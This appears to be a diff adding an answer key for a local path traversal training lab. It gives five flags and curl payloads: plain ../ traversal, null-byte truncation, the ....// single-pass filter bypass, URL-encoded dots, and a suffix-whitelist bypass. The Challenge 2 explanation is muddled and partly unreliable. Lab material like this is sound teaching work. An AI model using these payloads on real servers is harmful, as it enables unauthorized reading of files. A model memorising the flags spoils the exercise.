@@ -1,0 +1,76 @@
+===============================================================================
+  NeonDocs — Path Traversal Lab Solutions (Port 5009)
+===============================================================================
+
+CHALLENGE 1: Basic Path Traversal
+Flag: FLAG{tr4v3rs4l_b4s1c}
+
+  The /view endpoint reads files from documents/public/ with no sanitization.
+
+  curl "http://localhost:5009/view?file=../../secret/flag.txt"
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 2: Null Byte Bypass
+Flag: FLAG{tr4v3rs4l_null_byt3}
+
+  The /view-safe endpoint appends ".txt" to the filename. But if the
+  input contains %00 (null byte), the code strips everything after
+  the null byte before appending .txt (simulating legacy C behavior).
+
+  curl "http://localhost:5009/view-safe?file=../../secret/flag2%00"
+
+  The %00 causes truncation. The server reads ../../secret/flag2.txt
+  (the .txt comes from the file itself, not the appended extension).
+
+  Alternative: Try ../../secret/flag2.txt directly since .txt gets
+  double-appended to become flag2.txt.txt — check exact behavior.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 3: Double-Encoding Filter Bypass
+Flag: FLAG{tr4v3rs4l_3nc0d1ng}
+
+  The /view-filtered endpoint does file.replace("../", "") but only
+  in a single pass. Use ....// which becomes ../ after the replacement.
+
+  curl "http://localhost:5009/view-filtered?file=....//....//secret/flag3.txt"
+
+  After single-pass removal of "../":
+    ....// → ../ (the outer ../ remains after inner ../ is removed)
+
+  Alternative: ..././..././secret/flag3.txt
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 4: URL-Encoding Evasion
+Flag: FLAG{tr4v3rs4l_3v4s10n}
+
+  The /download endpoint checks the raw parameter for ".." and "/etc"
+  BEFORE URL-decoding it. URL-encode the dots to bypass the check.
+
+  curl "http://localhost:5009/download?path=%2e%2e/%2e%2e/secret/flag4.txt"
+
+  Or fully encoded:
+  curl "http://localhost:5009/download?path=%2e%2e%2f%2e%2e%2fsecret%2fflag4.txt"
+
+  The check sees "%2e%2e" (no literal ".."), then URL-decodes to "../"
+  before opening the file.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 5: Whitelist Bypass via Path Prefix
+Flag: FLAG{tr4v3rs4l_wh1t3l1st}
+
+  The /api/doc endpoint has a whitelist check:
+    any(name.endswith(allowed) for allowed in whitelist)
+  where whitelist = ['readme.txt', 'report.txt', 'manual.txt']
+
+  It only checks the END of the filename, not the full path.
+
+  curl "http://localhost:5009/api/doc?name=../../secret/flag5/readme.txt"
+
+  The name ends with "readme.txt" (whitelisted) but the ../ prefix
+  escapes to the secret directory where the flag is stored.
+
+===============================================================================
